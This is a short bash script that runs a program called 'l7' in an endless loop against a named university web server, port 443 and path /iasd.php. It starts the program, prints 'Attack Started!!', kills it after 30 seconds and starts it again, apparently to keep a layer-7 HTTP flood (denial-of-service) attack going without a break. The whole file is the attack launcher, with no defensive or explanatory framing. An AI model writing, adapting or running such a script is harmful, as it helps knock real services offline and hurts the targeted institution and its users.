#!/bin/bash
procname="l7"
atk_cmd="./l7 manila.lpu.edu.ph 443 /iasd.php 200 30"
while true
do
    $atk_cmd >/dev/null &
    echo Attack Started!!
    sleep 30
    echo Attack killed!!
    kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
    $atk_cmd >/dev/null &
    sleep 0.1
done
